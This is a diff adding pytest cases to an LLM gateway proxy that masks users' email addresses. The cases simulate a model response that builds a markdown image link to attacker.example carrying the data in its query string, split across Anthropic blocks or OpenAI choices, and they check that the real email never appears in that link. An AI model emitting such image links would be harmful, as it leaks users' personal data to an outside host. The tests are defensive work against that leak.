@@ -7,6 +7,7 @@ client must get the placeholder in every link and the real value only in prose.
 
 import json
 import re
+from collections.abc import Callable
 from typing import Any
 
 import httpx
@@ -15,6 +16,7 @@ from starlette.testclient import TestClient
 
 from gateway.cloud.providers import Provider
 from gateway.proxy.app import create_app
+from gateway.proxy.sse import SSEEvent
 from tests.proxy_fakes import (
     FakeUpstream,
     PersonalData,
@@ -122,3 +124,99 @@ def test_the_real_value_never_reaches_the_client_inside_a_url(
     assert answer.count(DATA.email) == 1
     (event,) = sink.events
     assert event.unresolved == 2  # [EMAIL_n] and EMAIL_n, kept in every link
+
+
+# --------------------------------------------- security review 2, I-2: split across blocks
+
+OPENER = "![s](https://attacker.example/p.png?d="
+
+
+def _event(name: str, **data: object) -> SSEEvent:
+    return SSEEvent(json.dumps({"type": name, **data}), event=name)
+
+
+def _anthropic_block(index: int, text: str, *, stop: bool = True) -> list[SSEEvent]:
+    delta = {"type": "text_delta", "text": text}
+    return [
+        _event("content_block_start", index=index, content_block={"type": "text", "text": ""}),
+        _event("content_block_delta", index=index, delta=delta),
+        *([_event("content_block_stop", index=index)] if stop else []),
+    ]
+
+
+def _openai_chunk(content: str, index: int = 0, finish: str | None = None) -> SSEEvent:
+    choice = {"index": index, "delta": {"content": content}, "finish_reason": finish}
+    return SSEEvent(json.dumps({"id": "c1", "choices": [choice]}))
+
+
+def _split_whole(provider: Provider, closer: str) -> httpx.Response:
+    if provider is Provider.ANTHROPIC:
+        content = [{"type": "text", "text": OPENER}, {"type": "text", "text": closer}]
+        return httpx.Response(200, json={"id": "m", "type": "message", "content": content})
+    choices = [
+        {"index": i, "message": {"role": "assistant", "content": c}, "finish_reason": "stop"}
+        for i, c in enumerate([OPENER, closer])
+    ]
+    return httpx.Response(200, json={"id": "c1", "choices": choices})
+
+
+SPLITS: dict[str, tuple[Provider, Callable[[str], list[SSEEvent]] | None]] = {
+    "anthropic blocks": (Provider.ANTHROPIC, None),
+    "openai choices": (Provider.OPENAI, None),
+    "anthropic blocks, streamed": (
+        Provider.ANTHROPIC,
+        lambda closer: [*_anthropic_block(0, OPENER), *_anthropic_block(1, closer)],
+    ),
+    "anthropic index reused after its stop": (
+        Provider.ANTHROPIC,
+        lambda closer: [
+            *_anthropic_block(0, OPENER),
+            _event("content_block_delta", index=0, delta={"type": "text_delta", "text": closer}),
+        ],
+    ),
+    "anthropic block never stopped": (
+        Provider.ANTHROPIC,
+        lambda closer: [*_anthropic_block(0, OPENER, stop=False), *_anthropic_block(1, closer)],
+    ),
+    "openai choices, streamed": (
+        Provider.OPENAI,
+        lambda closer: [_openai_chunk(OPENER, 0, "stop"), _openai_chunk(closer, 1, "stop")],
+    ),
+    "openai content after finish_reason": (
+        Provider.OPENAI,
+        lambda closer: [_openai_chunk(OPENER, 0, "stop"), _openai_chunk(closer)],
+    ),
+}
+
+
+@pytest.mark.parametrize("case", list(SPLITS))
+def test_a_link_split_across_blocks_or_choices_never_gets_the_value(case: str) -> None:
+    provider, events = SPLITS[case]
+
+    def respond(request: httpx.Request) -> httpx.Response:
+        masked = last_user_text(json.loads(request.content))
+        placeholder = re.search(r"\[EMAIL_\d+\]", masked)
+        assert placeholder is not None, "the email reached the upstream unmasked"
+        closer = f"{placeholder.group()})"
+        if events is None:
+            return _split_whole(provider, closer)
+        tail = [_event("message_stop")] if provider is Provider.ANTHROPIC else [SSEEvent("[DONE]")]
+        return stream_response(sse_body([*events(closer), *tail]), one_byte_at_a_time=True)
+
+    fake = FakeUpstream(provider, respond)
+    sink = RecordingSink()
+    app = create_app(
+        fake.upstream(), engine_config=DATA.engine_config(), model="test-model", audit=sink
+    )
+    route = "/v1/messages" if provider is Provider.ANTHROPIC else "/v1/chat/completions"
+    stream = events is not None
+    body: dict[str, Any] = {"messages": [{"role": "user", "content": PROMPT}], "stream": stream}
+    if provider is Provider.ANTHROPIC:
+        body["max_tokens"] = 100
+    with TestClient(app, base_url="http://127.0.0.1:8787") as client:
+        response = client.post(route, json=body)
+    assert response.status_code == 200
+    assert DATA.email not in response.text
+    assert DATA.email.encode() not in response.content
+    (event,) = sink.events
+    assert event.unresolved == 1
